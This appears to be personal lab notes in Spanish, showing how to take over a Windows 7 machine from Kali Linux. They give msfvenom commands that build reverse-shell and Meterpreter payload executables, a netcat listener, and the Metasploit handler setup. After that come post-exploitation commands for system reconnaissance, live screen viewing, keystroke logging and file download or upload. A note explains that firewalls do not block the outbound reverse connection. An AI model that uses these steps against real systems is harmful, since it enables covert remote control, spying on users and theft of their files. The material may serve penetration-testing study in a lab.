++ PC1: Kali
++ PC2: Windows 7 x86

++ PC2: Firewall de windows apagado
--- Nota: Aún con el firewall activo el proceso puede llevarse a cabo,
esto es debido a que el firewall es capaz de bloquear tráfico de entrada más no 
de salida. Este es el caso del reverse shell: el equipo con windows se conecta al equipo con kali (tráfico de salida)
++ PC1: msfvenom -p windows/shell_reverse_tcp lhost=<ip_PC1> lport=<443> -f exe > <nombre_programa>
--- Ubicar ip de PC1 con: id addr show
++ PC1: nc lvp 443
++ PC2: iniciar el programa
++ PC1: Tendrá acceso a la línea de comandos de PC2 
--- Comandos útiles:
----- systeminfo (Nos permite ver información del S.O.)
----- net start (Nos permite ver los comandos que se están ejecutando)
----- wmic product get name,version,vendor (Nos permite ver que programas están instalados en el S.O.)
----- wmic qfe get Caption, Description (Nos permite ver las actualizaciones que están instaladas en el S.O.)
----- whoami (Permite ver el usuario activo)
----- whoami /priv (Permite ver los privilegios del usuario activo)
----- whoami /groups (Permite ver la correspondencia del usuario con los grupos)
----- dir (Permite ver la estructura de los directorios)
----- cd (Permite navegar entre los directorios)
----- arp -a (Permite ver los otros dispositivos que están en la red)
----- ipconfig (Nos permite ver la información de red del equipo)
----- netstat (Nos permite ver que programas tienen conexión a internet)

++ Uso de msfvenom para captura de escritorio, audio, etc
--- PC1: msfvenom -p windows/meterpreter/reverse_http lhost=<ip_PC1> lport=<443> -f exe > <nombre_programa>
----- Nota: como podemos apreciar el comando es muy parecido al usado anteriormente, la principal diferencia es la presencia de /meterpreter (Esto es lo que permite hacer uso de comandos más sofisticados para tomar capturas de escritorio, audio, etc
--- PC2: Ejecutar el programa generado
--- PC1: msfconsole
--- PC1: use exploit/multi/handler
--- PC1: Enter
--- PC1: set lhost <ip_PC1>
--- PC1: set lport 443
--- PC1: set payload windows/meterpreter/reverse_http
--- PC1: exploit
--- PC1: meterpreter> (Esto nos indica que podemos ejecutar comandos tales como:)
---- help (Ver todos los comandos disponibles)
---- screenshare (Ver lo que realiza el usuario en tiempo real)
---- screenshot (Tomar una captura de la pantalla del usuario)
---- keyscan_start (Iniciar la captura del teclado)
---- keyscan_stop (Parar la captura del teclado)
---- download <nombre_archivo> (Descargar un archivo del PC2)
---- upload <nombre_archivo> (Subir un archivo al PC2)










